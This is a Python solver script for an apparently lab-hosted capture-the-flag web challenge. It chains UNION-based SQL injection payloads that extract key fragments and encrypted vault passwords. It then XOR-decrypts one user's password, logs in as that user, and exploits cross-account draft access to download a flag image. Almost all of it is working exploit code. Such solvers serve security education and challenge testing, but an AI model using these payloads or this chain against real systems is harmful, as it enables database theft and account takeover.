import argparse
import html
import re
import secrets
from pathlib import Path

import requests
# queries
# ' AND 1=0) UNION ALL SELECT password_vault.user_id, users.username, "", password_vault.encrypted_password, 0, '', '', '' FROM password_vault ""JOIN users ON users.id=password_vault.user_id -- x
# ' AND 1=0) UNION ALL SELECT password_vault.user_id, users.username, "", password_vault.encrypted_password, 0, '', '', '' FROM password_vault ""JOIN users ON users.id=password_vault.user_id -- x
KEY_QUERY = (
    "' AND 1=0) UNION ALL SELECT phase, key_piece, CAST(phase AS TEXT), "
    "0, '', '', '' FROM password_notes -- x"
)
VAULT_QUERY = (
    "' AND 1=0) UNION ALL SELECT password_vault.user_id, users.username, "
    "password_vault.encrypted_password, 0, '', '', '' FROM password_vault "
    "JOIN users ON users.id=password_vault.user_id -- x"
)


def cards(page):
    results = []
    for card in re.findall(r'<article class="card">(.*?)</article>', page, re.S):
        title = re.search(r"<h3>(.*?)</h3>", card, re.S)
        description = re.search(r"<p>(.*?)</p>", card, re.S)
        if title and description:
            results.append(
                (
                    html.unescape(title.group(1).strip()),
                    html.unescape(description.group(1).strip()),
                )
            )
    return results


def signup(client, base):
    username = "solver_" + secrets.token_hex(4)
    password = "solverpass"
    response = client.post(
        base + "/signup",
        data={"username": username, "password": password},
        allow_redirects=False,
    )
    if response.status_code != 302:
        raise RuntimeError("could not create the helper account")
    return username, password


def login(client, base, username, password):
    response = client.post(
        base + "/login",
        data={"username": username, "password": password},
        allow_redirects=False,
    )
    if response.status_code != 302:
        raise RuntimeError(f"login failed for {username}")


def solve(args):
    outsider = requests.Session()
    helper_username, helper_password = signup(outsider, args.url)

    key_page = outsider.get(args.url + "/", params={"q": KEY_QUERY}).text
    pieces = [(int(phase), piece) for piece, phase in cards(key_page)]
    if len(pieces) != 5:
        raise RuntimeError("did not recover all five key pieces")
    recovery_key = "".join(piece for _, piece in sorted(pieces)).encode()

    vault_page = outsider.get(args.url + "/", params={"q": VAULT_QUERY}).text
    encrypted_passwords = dict(cards(vault_page))
    encrypted_zuko = bytes.fromhex(encrypted_passwords["Zuko"])
    zuko_password = bytes(
        byte ^ recovery_key[index % len(recovery_key)]
        for index, byte in enumerate(encrypted_zuko)
    ).decode("utf-8")

    zuko = requests.Session()
    login(zuko, args.url, "Zuko", zuko_password)
    drafts = zuko.get(args.url + "/account/drafts").text
    match = re.search(r'href="/([^"/]+)/unlock"', drafts)
    if not match:
        raise RuntimeError("Zuko's private draft was not found")
    slug = match.group(1)

    outsider_view = outsider.get(args.url + f"/{slug}/unlock").text
    if 'name="release_password"' in outsider_view:
        raise RuntimeError("the cross-account draft view did not work")
    flag_image = outsider.get(args.url + f"/{slug}/preview")
    if flag_image.status_code != 200 or not flag_image.content.startswith(b"\x89PNG"):
        raise RuntimeError("flag preview could not be downloaded")
    args.output.write_bytes(flag_image.content)

    print(f"helper account: {helper_username} / {helper_password}")
    print(f"recovery key: {recovery_key.decode()}")
    print(f"Zuko password: {zuko_password}")
    print(f"draft: /{slug}/unlock")
    print(f"flag image: {args.output.resolve()}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Solve CSALE and download the flag image")
    parser.add_argument("url", nargs="?", default="http://localhost:5000")
    parser.add_argument("--output", type=Path, default=Path("csale-flag.png"))
    solve(parser.parse_args())
